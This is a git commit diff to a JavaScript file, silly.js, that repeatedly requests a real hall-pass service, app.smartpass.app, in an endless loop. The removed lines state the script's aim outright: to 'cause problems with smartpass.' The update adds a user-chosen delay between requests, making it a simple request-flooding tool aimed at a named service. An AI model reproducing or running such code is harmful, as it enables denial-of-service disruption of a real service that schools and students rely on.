527a461372c0cd6c25fecee387164c9205e11579
CampBatt <120993447+CampBatt@users.noreply.github.com>
2024-03-03 00:37:22 -0500

    Update silly.js

--- silly.js
+++ silly.js
@@ -1,4 +1,19 @@
-alert("you are being used in an attempt to cause problems with smartpass :)")
-while (true){
-    await fetch("https://app.smartpass.app/main/passes");
+async function fetchPasses() {
+    var delay_time = prompt("input time between each request (in miliseconds)")
+    var num_delay = parseInt(delay_time);
+
+    if (!isNaN(num_delay)) {
+        alert("Starting with a delay of " + num_delay.toString + 'ms');
+    } else {
+        alert("Invalid input, defualting to 250ms");
+        var num_delay = 250
+    }
+    while (true) {
+        await fetch("https://app.smartpass.app/main/passes");
+        // Add a delay here before the next fetch
+        await new Promise(resolve => setTimeout(resolve, num_delay)); // Adjust the delay time as needed (in milliseconds)
+    }
 }
+
+fetchPasses(); // Start the fetch loop
+
